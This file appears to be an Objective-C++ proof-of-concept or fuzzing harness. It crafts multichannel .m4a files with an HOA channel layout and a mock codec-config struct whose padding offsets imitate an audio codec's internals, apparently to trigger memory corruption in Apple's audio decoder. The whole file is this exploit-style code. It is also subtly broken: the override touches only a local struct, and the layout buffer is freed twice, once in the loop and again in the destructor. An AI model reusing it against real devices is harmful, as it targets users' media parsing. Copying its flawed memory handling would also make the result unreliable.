@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>

struct CodecConfig {
  char padding0[0x78];
  AudioChannelLayout* remappingChannelLayout;
  char padding1[0xe0 - 0x80];
  std::vector<char> mRemappingArray;

  CodecConfig() : remappingChannelLayout(nullptr) {}
  ~CodecConfig() {
    if (remappingChannelLayout) {
      free(remappingChannelLayout);
    }
  }
};

void OverrideApac(CodecConfig* config) {
  if (config->remappingChannelLayout) {
    config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3; // Order 1, 4 channels
  }
  config->mRemappingArray.resize(1024, 0xff); // Moderate size for fuzzing
}

int main() {
  std::vector<double> sampleRates = {16000, 44100, 48000, 96000}; // Skip 8000 Hz for AAC
  std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM};
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> formatDist(0, formats.size() - 1);

  for (double sampleRate : sampleRates) {
    AudioFormatID formatID = formats[formatDist(gen)];
    if (formatID == kAudioFormatMPEG4AAC && sampleRate < 16000) {
      fprintf(stderr, "Skipping unsupported sample rate %.0f for AAC\n", sampleRate);
      continue;
    }
    uint32_t channelNum = 4; // 4 channels for HOA order 1
    AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate
                                                                             channels:channelNum];
    AudioStreamBasicDescription outputDescription = {
        .mSampleRate = sampleRate,
        .mFormatID = formatID,
        .mFormatFlags = (formatID == kAudioFormatLinearPCM) ? kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked : 0,
        .mBytesPerPacket = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
        .mFramesPerPacket = static_cast<UInt32>((formatID == kAudioFormatMPEG4AAC) ? 1024 : 1), // Fix narrowing error at line 48
        .mBytesPerFrame = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
        .mChannelsPerFrame = channelNum,
        .mBitsPerChannel = static_cast<UInt32>((formatID == kAudioFormatLinearPCM) ? 32 : 0), // Fix narrowing error at line 51
        .mReserved = 0
    };

    AVAudioChannelLayout* channelLayout = [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3];

    CodecConfig config;
    AudioChannelLayout* channelLayoutCopy = (AudioChannelLayout*)malloc(sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum);
    if (!channelLayoutCopy) {
      fprintf(stderr, "Memory allocation failed for sample rate %.0f\n", sampleRate);
      continue;
    }
    memcpy(channelLayoutCopy, channelLayout.layout, sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum);
    config.remappingChannelLayout = channelLayoutCopy;

    OverrideApac(&config);

    NSString* fileName = [NSString stringWithFormat:@"output_%.0f_%u.m4a", sampleRate, formatID];
    NSURL* outUrl = [NSURL fileURLWithPath:fileName];
    ExtAudioFileRef audioFile = nullptr;
    OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileM4AType,
                                                &outputDescription, config.remappingChannelLayout,
                                                kAudioFileFlags_EraseFile, &audioFile);
    if (status) {
      fprintf(stderr, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      free(channelLayoutCopy);
      continue;
    }

    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                     sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
    if (status) {
      fprintf(stderr, "Error setting format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      ExtAudioFileDispose(audioFile);
      free(channelLayoutCopy);
      continue;
    }

    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                     sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum, formatIn.channelLayout.layout);
    if (status) {
      fprintf(stderr, "Error setting layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      ExtAudioFileDispose(audioFile);
      free(channelLayoutCopy);
      continue;
    }

    float audioBuffer[44100 * channelNum];
    std::uniform_real_distribution<float> dis(-1.0f, 1.0f);
    for (int i = 0; i < 44100 * channelNum; ++i) {
      audioBuffer[i] = dis(gen);
    }
    AudioBufferList audioBufferList = {
        .mNumberBuffers = 1,
        .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = static_cast<UInt32>(sizeof(audioBuffer)), .mData = audioBuffer}}, // Fix narrowing error at line 105
    };
    status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);
    if (status) {
      fprintf(stderr, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    }

    status = ExtAudioFileDispose(audioFile);
    if (status) {
      fprintf(stderr, "Error closing file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    }

    free(channelLayoutCopy);
  }
  return 0;
}
